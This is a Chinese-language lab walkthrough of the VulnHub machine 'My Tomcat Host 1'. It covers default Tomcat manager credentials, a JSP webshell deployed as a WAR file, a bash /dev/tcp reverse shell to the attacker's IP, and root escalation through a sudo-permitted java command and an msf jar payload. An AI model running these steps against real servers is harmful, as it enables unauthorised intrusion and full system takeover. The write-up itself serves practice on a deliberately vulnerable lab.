**靶机搭建  
**

**靶机地址：**https://www.vulnhub.com/entry/my-tomcat-host-1,457/

**靶机目标：**

目标1：提权查看root目录下的proof.txt文件。

**使用工具:**

nc、portscan、msf、kali。

**操作过程**

**0x00 ****信息收集**

首先给定一个IPhttp://192.168.180.44/，其他的什么也不知道。那就开始扫描端口吧，看有什么端口开启，开放了什么服务。

这里我使用的是portscan扫描端口，也可以使用nmap等其他工具。

![](../Images/572ab2aa1d1a4beb4dab7d56251e024f.png)

可以看到开放22端口和8080端口。

首先访问8080端口，开始目录扫描，访问该目录会发现管理后台为manager。

![](../Images/98161e682f787a0ebc67e0f45dbaac56.png)

**0x01 ****漏洞利用**

访问后台，发现后台密码为弱口令，tomcat:tomcat。

![](../Images/1e75b3720715bc39937a696002e617f6.png)

还可以查看到tomcat的服务器信息。

![](../Images/ddb22a6140db6d38116b33007654710d.png)

搜索tomcat的漏洞，其中有一个为tomcat后台部署war包漏洞，尝试一下。

首先先将jsp马进行压缩保存为zip文件，再将zip后缀改为war后缀。

![](../Images/bd8f158037560d84ef4a6f31dd54daaf.png)

在这里上传war包，并点击部署。

![](../Images/23329cd3cce9de24fb0fcc8527e358c0.png)

对比之前多了ma1目录，直接访问出错。我们访问ma1/ma1.jsp（马的路径加马的名字），直接输入密码即可成功。

![](../Images/23329cd3cce9de24fb0fcc8527e358c0.png)

可以发现存在后台部署war包漏洞。

**0x02 ****反弹shell**

之前已经上传了大马，我们可以执行命令或者看权限大小和能否提权。

在大马反弹shell。查找nc，无nc。

![](../Images/677007c92956c1a3de7ae70637063687.png)

查找bash命令，存在bash命令。

![](../Images/5385c6fa27468cba24b24d1443e045b2.png)

使用bash反弹，连接失败。

![](../Images/d83fcdca8e9414ee4ebfe8fe3c5e6a88.png)

在这里我重新上传了一个ss.jsp,由于临时更换热点的原因，更改了ip。

更改ip为http://192.168.180.32:8080/ss/ss.jsp

使用cknife连接生成的马。

![](../Images/a6fca3fdc316cc575a928db7d5369fe8.png)

终端执行bash反弹shell。

bash -i >& /dev/tcp/192.168.60.146/88880>&1

![](../Images/962aa283f3bc39bd086dd02168304f53.png)

nc监听，成功反弹shell，但是显示是不成功的。

![](../Images/c87472bb799b6f64b21bf20ae1e7313c.png)

**0x03 ****提权**

sudo -l

进入系统，查看 sudo 权限发现有一个 java 命令，那就可以再次制作一个 jar 木马，然后建立shell。需要使用tty。python-c 'import pty;pty.spawn("/bin/sh")'

![](../Images/01f241fa13c89e867137538e9a0cec7d.png)

使用msf生成root.jar。

![](../Images/a3fd4200ca40690e8a4783587ecdedaf.png)

使用ssh连接scp命令传文件失败。

![](../Images/6c85dd9d08347250dff55d8315a9f3d7.png)

本机开启服务，使用wget下载文件。

![](../Images/12a5488b546a438e3eab66b553a197f2.png)

![](../Images/4bcb231ddcfab5306a62a12080943875.png)

以root权限执行sudo -u root java -jar root.jar 提示必须有一个tty。

![](../Images/905f3ff4788d81bf1895bf045927262a.png)

我们使用python弹一个tty。

python -c 'importpty;pty.spawn("/bin/sh")'

![](../Images/bc7ebaa6f78e99d1ed0b8a42d79d4acb.png)

nc监听。

![](../Images/5b70348b49105448f3bb4ecd072afc22.png)

监听发现实现连接，但是未出现交互式shell。再次输入python -c 'import pty;pty.spawn("/bin/sh")' ，现在已经是交互式shell了。id查看权限，提权成功。

![](../Images/474b05fd7b610476fc81458b2f661713.png)

**思路总结：**

通过扫描端口，发现存在8080端口。使用tomcat后台部署war包获取shell，CKnife连接jsp马。bash反弹弹出shell，使用sudo -l查看可执行命令为java，所以使用msf生成jar包，使用sudo root java执行jar包，并进行反弹shell，最后成功提权。
